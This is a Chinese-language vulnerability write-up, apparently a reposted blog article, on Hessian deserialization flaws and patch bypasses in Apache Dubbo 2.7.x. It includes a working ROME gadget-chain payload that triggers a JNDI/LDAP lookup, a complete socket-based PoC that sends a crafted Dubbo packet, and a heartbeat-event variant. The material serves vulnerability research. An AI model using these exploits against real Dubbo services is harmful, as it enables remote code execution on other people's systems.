<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [tttang.com](https://tttang.com/archive/1730/)

> 跳跳糖 - 安全与分享社区

[前言](#toc_)
-----------

Apache Dubbo 是一款高性能、轻量级的开源 Java RPC 框架，它提供了三大核心能力：面向接口的远程方法调用、智能容错和负载均衡、以及服务自动注册和发现。

Dubbo RPC 是 Apache Dubbo 体系中最核心的一种高性能、高吞吐量的远程调用方式，主要用于两个 Dubbo 系统之间远程调用。在 Dubbo RPC 中，支持多种序列化方式，如 dubbo 序列化、hessian2 序列化、kryo 序列化、json 序列化、java 序列化等等

官方推荐的默认 Dubbo 协议

其架构主要是：

[![](https://storage.tttang.com/media/attachment/2022/09/06/cbb79364-42bc-45de-9136-eb4a9fa8beef.png)](https://storage.tttang.com/media/attachment/2022/09/06/cbb79364-42bc-45de-9136-eb4a9fa8beef.png)

<table><thead><tr><th>节点</th><th>角色说明</th></tr></thead><tbody><tr><td>Provider</td><td>暴露服务的服务提供方</td></tr><tr><td>Consumer</td><td>调用远程服务的服务消费方</td></tr><tr><td>Registry</td><td>服务注册与发现的注册中心</td></tr><tr><td>Monitor</td><td>统计服务的调用次数和调用时间的监控中心</td></tr><tr><td>Container</td><td>服务运行容器</td></tr></tbody></table>

调用关系说明

1.  服务容器负责启动，加载，运行服务提供者。
2.  服务提供者在启动时，向注册中心注册自己提供的服务。
3.  服务消费者在启动时，向注册中心订阅自己所需的服务。
4.  注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。
5.  服务消费者，从提供者地址列表中，基于软负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。
6.  服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。

[环境搭建](#toc__1)
---------------

直接使用官方的案例

[https://github.com/apache/dubbo-samples](https://github.com/apache/dubbo-samples)

其中有一个 http 的例子

使用 Dubbo 服务需要有一个注册中心 zookeeper

[https://zookeeper.apache.org/releases.html](https://zookeeper.apache.org/releases.html)

一个接口

```
package org.apache.dubbo.samples.http.api;

public interface DemoService {
    String sayHello(String name);
}
```

实现类

```
public class DemoServiceImpl implements DemoService {

    @Override
    public String sayHello(String name) {
        System.out.println("[" + new SimpleDateFormat("HH:mm:ss").format(new Date()) + "] Hello " + name +
                ", request from consumer: " + RpcContext.getContext().getRemoteAddress());
        return "Hello " + name + ", response from provider: " + RpcContext.getContext().getLocalAddress();
    }

}
```

服务提供者

```
public class HttpProvider {

    public static void main(String[] args) throws Exception {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("spring/http-provider.xml");
        context.start();

        System.out.println("dubbo service started");
        new CountDownLatch(1).await();
    }

}
```

消费者

```
public class HttpConsumer {

    public static void main(String[] args) throws Exception {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("spring/http-consumer.xml");
        context.start();

        DemoService demoService = (DemoService) context.getBean("demoService");
        String result = demoService.sayHello("world");
        System.out.println(result);
    }
}
```

同样需要在资源目录下配置提供者和服务者的配置

`http-provider.xml`: 配置了接口和实现类

```
<beans xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:dubbo="http://dubbo.apache.org/schema/dubbo"
       xmlns="http://www.springframework.org/schema/beans" xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
       http://dubbo.apache.org/schema/dubbo http://dubbo.apache.org/schema/dubbo/dubbo.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">
    <context:property-placeholder/>

    <dubbo:application />

    <dubbo:registry address="zookeeper://${zookeeper.address:127.0.0.1}:2181"/>

    <dubbo:protocol ${servlet.port:8080}" server="${servlet.container:tomcat}"/>

    <bean id="demoService" class="org.apache.dubbo.samples.http.impl.DemoServiceImpl"/>

    <dubbo:service interface="org.apache.dubbo.samples.http.api.DemoService" ref="demoService" protocol="http"/>
</beans>
```

`http-consumer.xml`: 配置了访问的接口

```
<beans xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:dubbo="http://dubbo.apache.org/schema/dubbo"
       xmlns="http://www.springframework.org/schema/beans" xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
       http://dubbo.apache.org/schema/dubbo http://dubbo.apache.org/schema/dubbo/dubbo.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">
    <context:property-placeholder/>

    <dubbo:application />

    <dubbo:registry address="zookeeper://${zookeeper.address:127.0.0.1}:2181"/>

    <dubbo:reference id="demoService" interface="org.apache.dubbo.samples.http.api.DemoService"/>
</beans>
```

最后分别启动`zookeeper`提供者，消费者

[反序列化漏洞](#toc__2)
-----------------

### [Hessian 协议](#toc_hessian)

#### [<= 2.7.6](#toc_276)

##### [影响范围](#toc__3)

2.7.0 <= Dubbo Version <= 2.7.6  
2.6.0 <= Dubbo Version <= 2.6.7  
Dubbo 所有 2.5.x 版本（官方团队目前已不支持）

##### [环境](#toc__4)

这里主要是因为 dubbo 默认通过 hessian 协议进行反序列化造成的漏洞，我参照官方的 example 作为环境

[https://github.com/apache/dubbo-spring-boot-project](https://github.com/apache/dubbo-spring-boot-project)

下载漏洞版本 2.7.5，同样可以 clone 之后修改 pom.xml 文件

[![](https://storage.tttang.com/media/attachment/2022/09/06/5d1b31fa-71b4-4171-bee7-a93c03dc8979.png)](https://storage.tttang.com/media/attachment/2022/09/06/5d1b31fa-71b4-4171-bee7-a93c03dc8979.png)

我们使用其中的`provider`样例作为服务提供者

首先在 pom.xml 中条件利用依赖，有很多利用链，根据有什么依赖打什么链子，比如`SpringPartiallyComparableAdvisorHolder SpringAbstractBeanFactoryPointcutAdvisor Rome ROME+CC Groovy`等等多条利用链

这里我们通过 Rome 打 JNDI 注入和 ROME+CC 不出网进行例子

首先添加 ROME 依赖和 CC 依赖

```
<dependency>
    <groupId>com.rometools</groupId>
    <artifactId>rome</artifactId>
    <version>1.7.0</version>
</dependency>
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

因为 JNDI 注入在高版本 JDK 中有着限制，当然也有着高版本绕过方法，但是我们这里方便使用，我们直接将其属性值置为 true

```
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
```

之后配置`comsumer`环境

条件一个 getPayload 方法形成 ROME 链

```
private static Object getPayload() throws Exception {
    //反序列化时ToStringBean.toString()会被调用，触发JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup
    String jndiUrl = "ldap://127.0.0.1:1389/xitdbc";
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    rs.setDataSourceName(jndiUrl);
    rs.setMatchColumn("foo");

//反序列化时EqualsBean.beanHashCode会被调用，触发ToStringBean.toString
    ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);

//反序列化时HashMap.hash会被调用，触发EqualsBean.hashCode->EqualsBean.beanHashCode
    EqualsBean root = new EqualsBean(ToStringBean.class, item);

//HashMap.put->HashMap.putVal->HashMap.hash
    HashMap<Object, Object> s = new HashMap<>();
    setFieldValue(s, "size", 2);
    Class<?> nodeC;
    try {
        nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
        nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);

    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
    setFieldValue(s, "table", tbl);

    return s;
}
```

之后在调用方法的时候将这个数据传送过去

```
@Bean
public ApplicationRunner runner() throws Exception{
    Object o = getPayload();
    //return args -> logger.info(demoService.sayHello("mercyblitz"));
    return args -> logger.info(demoService.commonTest(o));
}
```

##### [分析](#toc__5)

好的，环境已经搭建好了，我们现在 debug 运行 provider

之后再运行 consumer 例子

首先给出调用栈，在具体分析

```
connect:624, JdbcRowSetImpl (com.sun.rowset)
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
hash:339, HashMap (java.util)
put:612, HashMap (java.util)
doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readObject:2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2080, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:92, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
decode:139, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)
```

前面都是方法的触发调用，之后在`DecodeHandler#received`方法中开始调用`decode`方法进行解码操作

[![](https://storage.tttang.com/media/attachment/2022/09/06/c8b10dfd-90cd-4731-b454-af32a7d94597.png)](https://storage.tttang.com/media/attachment/2022/09/06/c8b10dfd-90cd-4731-b454-af32a7d94597.png)

继续调用 decode 无参方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/c34ef6f6-9afd-45bb-9668-eae13c2bbd45.png)](https://storage.tttang.com/media/attachment/2022/09/06/c34ef6f6-9afd-45bb-9668-eae13c2bbd45.png)

其中 inputStream 是去掉 Dubbo 协议头的原始数据

[![](https://storage.tttang.com/media/attachment/2022/09/06/60d44b15-e7f3-4fa7-900e-95eaaac7c676.png)](https://storage.tttang.com/media/attachment/2022/09/06/60d44b15-e7f3-4fa7-900e-95eaaac7c676.png)

在这里获取了数据体的各个信息，在之后进行了一些数据处理之后

[![](https://storage.tttang.com/media/attachment/2022/09/06/ccb408d2-f547-4b0c-b31b-5d1388d8ae7b.png)](https://storage.tttang.com/media/attachment/2022/09/06/ccb408d2-f547-4b0c-b31b-5d1388d8ae7b.png)

这里调用了 in.readObject 方法，这里的 In 此时为`Hessian2ObjectInput`输入流对象

继续调用`readObject`方法，之后会在 readObject 方法调用中计算出 tag 标识

[![](https://storage.tttang.com/media/attachment/2022/09/06/faffb9d3-634e-4458-86f7-6e80c486dc10.png)](https://storage.tttang.com/media/attachment/2022/09/06/faffb9d3-634e-4458-86f7-6e80c486dc10.png)

之后通过 switch case 语句进行对应逻辑调用

[![](https://storage.tttang.com/media/attachment/2022/09/06/7f1cfbc1-8ff8-447f-a873-6ab0813c4254.png)](https://storage.tttang.com/media/attachment/2022/09/06/7f1cfbc1-8ff8-447f-a873-6ab0813c4254.png)

来到了`MapDerializer#readMap`的调用，从这里开始就是不是很熟悉了，后面就是 hessian 反序列化漏洞的内容了

[![](https://storage.tttang.com/media/attachment/2022/09/06/8141d3dd-0974-456f-a130-e3e63b154112.png)](https://storage.tttang.com/media/attachment/2022/09/06/8141d3dd-0974-456f-a130-e3e63b154112.png)

之后会创建一个 HashMap，然后调用其`doReadMap`方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/598a2bc7-ddd7-43f8-b221-ea7195a65572.png)](https://storage.tttang.com/media/attachment/2022/09/06/598a2bc7-ddd7-43f8-b221-ea7195a65572.png)

在该方法中存在有 hashMap.put 方法的调用，进而来到我们熟知的利用

调用 put -> hash -> key.hashCode

这时候的 key 为`EqualsBean`类对象

[![](https://storage.tttang.com/media/attachment/2022/09/06/1484044a-6bd2-4378-ae78-f9e5e2facc40.png)](https://storage.tttang.com/media/attachment/2022/09/06/1484044a-6bd2-4378-ae78-f9e5e2facc40.png)

调用其`beanHashCode`方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/b0cb7510-8621-4e03-9cd9-6001020d3c7d.png)](https://storage.tttang.com/media/attachment/2022/09/06/b0cb7510-8621-4e03-9cd9-6001020d3c7d.png)

进而调用了`ToStringBean#toString`方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/2364217c-8905-47eb-9195-2662067d6adc.png)](https://storage.tttang.com/media/attachment/2022/09/06/2364217c-8905-47eb-9195-2662067d6adc.png)

在其 toString 方法中有个很独特的，可以调用 getter 方法，我们顺手推舟就调用了`JdbcRowSetImpl`类的`getDatabaseMetaData`方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/8c9a5cb2-68d7-4f5b-bf46-1cd0f533bf69.png)](https://storage.tttang.com/media/attachment/2022/09/06/8c9a5cb2-68d7-4f5b-bf46-1cd0f533bf69.png)

进而在其 connect 方法中，触发了 JNDI 注入漏洞

[![](https://storage.tttang.com/media/attachment/2022/09/06/4f11fd60-7bb4-41a2-9581-51f689ab2bb9.png)](https://storage.tttang.com/media/attachment/2022/09/06/4f11fd60-7bb4-41a2-9581-51f689ab2bb9.png)

[![](https://storage.tttang.com/media/attachment/2022/09/06/d473c93b-306e-42a5-ab76-e817729bfe6a.png)](https://storage.tttang.com/media/attachment/2022/09/06/d473c93b-306e-42a5-ab76-e817729bfe6a.png)

在前面提到过可以打 ROME+CC 不出网的方式，主要也是利用可以触发任意 getter 方法，进而触发了 getOutputProperties 方法进而使用了 TemplateImpl 这条链子通过 Bytecodes 属性进行不出网利用

##### [补丁](#toc__6)

根据 diff 分析

[https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0L131](https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0L131)

[![](https://storage.tttang.com/media/attachment/2022/09/06/5e08abb8-49fd-49e2-8f71-fa20dceae1b8.png)](https://storage.tttang.com/media/attachment/2022/09/06/5e08abb8-49fd-49e2-8f71-fa20dceae1b8.png)

[![](https://storage.tttang.com/media/attachment/2022/09/06/40310109-802e-44ce-9033-b1318cbaf8ed.png)](https://storage.tttang.com/media/attachment/2022/09/06/40310109-802e-44ce-9033-b1318cbaf8ed.png)

判断了方法名是否等于`$invoke $echo $invokeAsync` , 如果方法名称不对的话, 就会直接抛出异常

#### [2.7.7](#toc_277)

##### [补丁绕过](#toc__7)

虽然在 2.7.7 版本中判断了方法名称, 但是我们仍然有着绕过的思路

既然他的方法名只能够是这个，那我们就使得方法名用他们三个中的一个就行了

步骤：

将上面环境中的 pom.xml 中的版本改为 2.7.7

且将 comsumer 端的方法名改为了`$echo`，之后运行

[![](https://storage.tttang.com/media/attachment/2022/09/06/48415da0-a4c8-43a4-87b8-3023bd3eeb2a.png)](https://storage.tttang.com/media/attachment/2022/09/06/48415da0-a4c8-43a4-87b8-3023bd3eeb2a.png)

[![](https://storage.tttang.com/media/attachment/2022/09/06/209c6168-e63f-48e1-99c6-fd347d925ec6.png)](https://storage.tttang.com/media/attachment/2022/09/06/209c6168-e63f-48e1-99c6-fd347d925ec6.png)

#### [2.7.8](#toc_278)

##### [分析](#toc__8)

在该版本中

在`isGenericCall` 和 `isEcho`中有了更多的限制

[![](https://storage.tttang.com/media/attachment/2022/09/06/8987ea4b-2bae-4551-b415-6fc027c94946.png)](https://storage.tttang.com/media/attachment/2022/09/06/8987ea4b-2bae-4551-b415-6fc027c94946.png)

限制了之后参数类型为`Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;` 或者 `Ljava/lang/Object;` 的时候才会继续进行反序列化操作

使用上面的方式就行不通了

##### [默认的 Hessian2 反序列化](#toc_hessian2)

值得注意的是，这种反序列姿势，不仅可以在这个版本中使用，同样可以一直到 2.7.13 中去

我们来关注一下`DecodeableRpcInvocation#decode`方法中的代码

[![](https://storage.tttang.com/media/attachment/2022/09/06/fb89da46-0b21-461e-8dfb-1587c1466d55.png)](https://storage.tttang.com/media/attachment/2022/09/06/fb89da46-0b21-461e-8dfb-1587c1466d55.png)

在之前的分析中我们知道了这个方法是用来获取数据体中的一些信息用的，其中一种利用方式就是通过在读取 version 的时候，调用 readUTF 方法，跟进

[![](https://storage.tttang.com/media/attachment/2022/09/06/79ffaf34-8ae1-481e-a8c5-4ae8594a528f.png)](https://storage.tttang.com/media/attachment/2022/09/06/79ffaf34-8ae1-481e-a8c5-4ae8594a528f.png)

会调用`Hessian2Input#readString`方法，跟进

[![](https://storage.tttang.com/media/attachment/2022/09/06/7d7b445e-ee6e-45d3-a2fd-bbddd9cab2ec.png)](https://storage.tttang.com/media/attachment/2022/09/06/7d7b445e-ee6e-45d3-a2fd-bbddd9cab2ec.png)

主要是通过获取 tag 位，进行相应的处理，但是这里关键的就是，当这里不是一个 String 类型的时候，将会抛出异常

[![](https://storage.tttang.com/media/attachment/2022/09/06/b8887d82-5427-4b50-bee7-712d8a0d16b6.png)](https://storage.tttang.com/media/attachment/2022/09/06/b8887d82-5427-4b50-bee7-712d8a0d16b6.png)

跟进 expect 的调用

[![](https://storage.tttang.com/media/attachment/2022/09/06/8d7f5fb4-e1be-4469-8439-53429374168c.png)](https://storage.tttang.com/media/attachment/2022/09/06/8d7f5fb4-e1be-4469-8439-53429374168c.png)

这里调用了一个 readObject 方法，跟进看看

[![](https://storage.tttang.com/media/attachment/2022/09/06/0ce6811e-de1e-4aee-8166-32ba14e2ef1a.png)](https://storage.tttang.com/media/attachment/2022/09/06/0ce6811e-de1e-4aee-8166-32ba14e2ef1a.png)

[![](https://storage.tttang.com/media/attachment/2022/09/06/cdada1c2-d410-4e7a-bdf5-2cfe1678c7d8.png)](https://storage.tttang.com/media/attachment/2022/09/06/cdada1c2-d410-4e7a-bdf5-2cfe1678c7d8.png)

同样是获取 tag 位做出相应的处理操作

如果 tag 为 72 的时候将会获取对应的 Deserializer 类，之后调用他的 readMap，通过 hessian 反序列化的学习我们是知道 ROME 链中就是`MapDeserilizer`，然后调用 readMap 就和 hessian 反序列化一样了

所以我们需要使得这里的不为 String 而是一个 HashMap 对象

给出调用栈

```
connect:624, JdbcRowSetImpl (com.sun.rowset)
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
hash:339, HashMap (java.util)
put:612, HashMap (java.util)
doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readObject:2733, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2308, Hessian2Input (com.alibaba.com.caucho.hessian.io)
expect:3561, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readString:1883, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readUTF:89, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
decode:103, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:80, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)
```

[![](https://storage.tttang.com/media/attachment/2022/09/06/daa6b7f9-dd37-4561-a344-c50b25f39111.png)](https://storage.tttang.com/media/attachment/2022/09/06/daa6b7f9-dd37-4561-a344-c50b25f39111.png)

最后给出 poc

```
package org.apache.dubbo.spring.boot.demo.consumer;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

import static org.apache.dubbo.common.utils.FieldUtils.setFieldValue;

public class Exp {
    private static Object getPayload() throws Exception {
        //反序列化时ToStringBean.toString()会被调用，触发JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup
        String jndiUrl = "ldap://127.0.0.1:1389/xitdbc";
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn("foo");

//反序列化时EqualsBean.beanHashCode会被调用，触发ToStringBean.toString
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);

//反序列化时HashMap.hash会被调用，触发EqualsBean.hashCode->EqualsBean.beanHashCode
        EqualsBean root = new EqualsBean(ToStringBean.class, item);

//HashMap.put->HashMap.putVal->HashMap.hash
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
        setFieldValue(s, "table", tbl);

        return s;
    }
    public static void main(String[] args) throws Exception {
        byte[] header = new byte[16];
        Bytes.short2bytes((short) 0xdabb, header);
        header[2] = (byte) ((byte) 0x80 | 2);
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
        out.writeObject(getPayload());

        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }
        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
        byte[] bytes = byteArrayOutputStream.toByteArray();

        @SuppressWarnings( "resource")
        Socket socket = new Socket( "127.0.0.1", 9999) ;
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush() ;
        outputStream.close();
    }
}
```

##### [Hessian2 way 2](#toc_hessian2-way-2)

另一种利用方式就是在 Dubbo 协议解析的位置

`org.apache.dubbo.remoting.exchange.codec.ExchangeCodec#decode`方法中

[![](https://storage.tttang.com/media/attachment/2022/09/06/b2390f4e-95ec-4a4a-81dc-a98b59cc1ab3.png)](https://storage.tttang.com/media/attachment/2022/09/06/b2390f4e-95ec-4a4a-81dc-a98b59cc1ab3.png)

网上找的 dubbo 协议格式

[![](https://storage.tttang.com/media/attachment/2022/09/06/573a7e17-f6fd-4b79-bb0b-4481f976ae96.png)](https://storage.tttang.com/media/attachment/2022/09/06/573a7e17-f6fd-4b79-bb0b-4481f976ae96.png)

开头的 magic 位类似 java 字节码文件里的魔数，用来判断是不是 dubbo 协议的数据包，魔数是常量 0xdabb，用于判断报文的开始

函数在解析 dubbo 协议时先判断请求头是否是魔术字 0xdabb

当魔术头校验通过后，将会调用`decodeBody`方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/838f63ce-eb7c-4a7c-b129-edb7ec4659e5.png)](https://storage.tttang.com/media/attachment/2022/09/06/838f63ce-eb7c-4a7c-b129-edb7ec4659e5.png)

函数获取 flag 标志位，一共 8 个地址位。低四位用来表示消息体数据用的序列化类型（默认 hessian），高四位中，第一位为 1 表示是 request 请求，第二位为 1 表示双向传输（即有返回 response），第三位为 1 表示是心跳事件。调用相应的反序列化函数对数据流进行反序列化操作

当服务端判断接收到的为事件时，会调用`decodeHeartbeatData`

[![](https://storage.tttang.com/media/attachment/2022/09/06/ea742106-4a44-4248-94f9-5217040d64f7.png)](https://storage.tttang.com/media/attachment/2022/09/06/ea742106-4a44-4248-94f9-5217040d64f7.png)

进而调用了`decodeEventData`方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/dd65195b-2c77-4234-8871-554ba48d8469.png)](https://storage.tttang.com/media/attachment/2022/09/06/dd65195b-2c77-4234-8871-554ba48d8469.png)

接着调用了一个`in.readEvent`方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/6d3038d4-4fde-4a66-9f04-a6bb5c10bbc8.png)](https://storage.tttang.com/media/attachment/2022/09/06/6d3038d4-4fde-4a66-9f04-a6bb5c10bbc8.png)

最后调用了 readObject 方法，造成反序列化漏洞

稍微将前面的 payload 修改一下将 flag 置为 event 事件就会触发漏洞

先放一个调用栈

```
connect:624, JdbcRowSetImpl (com.sun.rowset)
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
hash:339, HashMap (java.util)
put:612, HashMap (java.util)
doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readObject:2733, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2308, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:94, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
readEvent:83, ObjectInput (org.apache.dubbo.common.serialize)
decodeEventData:400, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decodeBody:122, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)
decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)
decode:85, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)
decodeRemovalReentryProtection:498, ByteToMessageDecoder (io.netty.handler.codec)
callDecode:437, ByteToMessageDecoder (io.netty.handler.codec)
channelRead:276, ByteToMessageDecoder (io.netty.handler.codec)
invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:357, AbstractChannelHandlerContext (io.netty.channel)
channelRead:1410, DefaultChannelPipeline$HeadContext (io.netty.channel)
invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:919, DefaultChannelPipeline (io.netty.channel)
read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)
processSelectedKey:714, NioEventLoop (io.netty.channel.nio)
processSelectedKeysOptimized:650, NioEventLoop (io.netty.channel.nio)
processSelectedKeys:576, NioEventLoop (io.netty.channel.nio)
run:493, NioEventLoop (io.netty.channel.nio)
run:989, SingleThreadEventExecutor$4 (io.netty.util.concurrent)
run:74, ThreadExecutorMap$2 (io.netty.util.internal)
run:30, FastThreadLocalRunnable (io.netty.util.concurrent)
run:748, Thread (java.lang)
```

payload 修改：

```
byte[] header = new byte[16];
Bytes.short2bytes((short) 0xdabb, header);
//        header[2] = (byte) ((byte) 0x80 | 2);
header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
```

[![](https://storage.tttang.com/media/attachment/2022/09/06/d7918d35-0e3f-4fed-8259-92743cb22aa5.png)](https://storage.tttang.com/media/attachment/2022/09/06/d7918d35-0e3f-4fed-8259-92743cb22aa5.png)

#### [2.7.9](#toc_279)

针对上一个版本 hessian 利用方式，对事件进行了长度限制

[![](https://storage.tttang.com/media/attachment/2022/09/06/eee4a0f8-1b52-473d-be53-995725cfe4ab.png)](https://storage.tttang.com/media/attachment/2022/09/06/eee4a0f8-1b52-473d-be53-995725cfe4ab.png)

判断了待反序列化的数据长度是否超过配置的阈值（默认为 50），如超过则抛出异常，不再继续反序列化，这样就导致了上面的 way 2 不能够使用了

但是上面的第一种方法仍然可以使用

